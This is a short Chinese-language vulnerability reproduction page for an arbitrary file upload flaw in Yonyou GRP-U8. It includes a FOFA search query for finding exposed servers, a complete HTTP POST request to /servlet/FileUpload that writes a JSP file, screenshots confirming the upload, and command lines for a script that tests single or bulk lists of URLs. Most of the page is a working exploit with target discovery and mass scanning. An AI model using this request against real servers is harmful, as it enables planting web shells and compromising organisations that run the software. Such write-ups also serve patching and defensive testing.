# 用友GRP-U8 FileUpload 文件上传漏洞

### 1.漏洞描述

用友GRP-U8是一款功能强大、灵活性高、可定制性强的企业资源管理软件，它可以帮助企业高效地管理资源，优化运营流程，提升整体管理水平。该产品存在任意文件上传漏洞。

### 2.fofa语法

```
app="用友-GRP-U8"
```

### 3.漏洞复现

```
POST /servlet/FileUpload?fileName=test.jsp&actionID=update HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Content-Length: 51
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close

<% out.println("This page has a vulnerability!");%>
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719832814287-678467e0-4265-4e17-bd3b-e23fa5c6956e.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

浏览器访问上传路径

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719832852691-b2862779-2991-4845-a2d1-bdda4d126224.png?x-oss-process=image%2Fformat%2Cwebp)

### 4.py脚本使用

```
python3 360 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 360 脚本文件名 -f url.txt             # 测试多个url
```

